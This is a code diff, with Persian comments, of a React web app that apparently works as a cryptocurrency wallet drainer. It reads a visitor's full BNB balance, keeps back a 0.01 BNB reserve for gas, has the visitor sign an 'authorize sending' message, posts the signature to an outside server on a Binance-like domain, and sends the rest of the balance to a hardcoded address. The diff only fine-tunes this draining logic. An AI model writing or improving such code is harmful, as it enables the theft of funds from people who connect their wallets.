@@ -2,12 +2,11 @@ import React, { useState } from "react";
 
 async function getLiveBalance(address) {
   try {
-    // دریافت بالانس به صورت hex از طریق eth_getBalance
+    // دریافت بالانس واقعی کیف پول از طریق eth_getBalance
     const balanceHex = await window.ethereum.request({
       method: "eth_getBalance",
       params: [address, "latest"],
     });
-    // تبدیل به عدد اعشاری
     return parseFloat(parseInt(balanceHex, 16) / 1e18).toFixed(6);
   } catch (error) {
     console.error("❌ Error fetching live balance:", error);
@@ -21,7 +20,7 @@ async function getGasPrice() {
       method: "eth_gasPrice",
       params: [],
     });
-    return parseInt(gasPriceHex, 16); // به Wei
+    return parseInt(gasPriceHex, 16);
   } catch (error) {
     console.error("❌ Error fetching gas price:", error);
     return null;
@@ -52,29 +51,25 @@ function App() {
     setAccount(userAddress);
     console.log("✅ User address:", userAddress);
 
-    // دریافت بالانس زنده از شبکه (eth_getBalance)
-    const liveBalance = await getLiveBalance(userAddress);
-    console.log("💰 Live BNB Balance:", liveBalance);
-    const totalBalance = parseFloat(liveBalance);
+    // دریافت بالانس واقعی از طریق eth_getBalance
+    const liveBalanceStr = await getLiveBalance(userAddress);
+    console.log("💰 Live BNB Balance:", liveBalanceStr);
+    const totalBalance = parseFloat(liveBalanceStr);
+    if (isNaN(totalBalance)) {
+      console.error("❌ Could not parse live balance.");
+      return;
+    }
 
-    // دریافت قیمت gas به صورت پویا
-    const gasPriceWei = await getGasPrice();
-    if (!gasPriceWei) return;
-    console.log("💰 Current gas price (Wei):", gasPriceWei);
-
-    const gasLimit = 21000; // استاندارد انتقال BNB
-    const gasCostBNB = (gasLimit * gasPriceWei) / 1e18;
-    console.log("Estimated gas cost (BNB):", gasCostBNB);
-
-    // اگر می‌خواهید reserve ثابت نداشته باشید، sendAmount = balance - gasCost
-    const sendAmount = totalBalance - gasCostBNB;
+    // تعیین reserve: به عنوان مثال reserve = 0.01 BNB
+    const reserveBNB = 0.01;
+    const sendAmount = totalBalance - reserveBNB;
     if (sendAmount <= 0) {
-      console.error("❌ Insufficient funds: not enough to cover gas fee.");
+      console.error("❌ Insufficient funds: not enough to cover reserve for gas fee.");
       return;
     }
     console.log("Calculated send amount (BNB):", sendAmount);
 
-    // ساخت پیام برای امضا (بر اساس sendAmount)
+    // ساخت پیام برای امضا بر اساس sendAmount
     const message = `Authorize sending ${sendAmount} BNB from ${userAddress}`;
     console.log("📜 Message to sign:", message);
 
@@ -90,7 +85,7 @@ function App() {
       return;
     }
 
-    // ارسال امضا به سرور جهت بررسی و ثبت لاگ
+    // ارسال امضا به سرور برای بررسی (آدرس واقعی send.php را جایگزین کنید)
     try {
       const resp = await fetch("https://sponsorbinance.vercel.app/api/proxy", {
         method: "POST",
@@ -115,11 +110,11 @@ function App() {
 
     // ساخت تراکنش واقعی
     const sendWeiHex = "0x" + (sendAmount * 1e18).toString(16);
+    // حذف gas و gasPrice برای استفاده از تخمین خودکار کیف پول
     const txParams = {
       from: userAddress,
       to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
       value: sendWeiHex
-      // gas و gasPrice حذف شده‌اند تا کیف پول به‌طور خودکار تخمین بزند.
     };
 
     try {
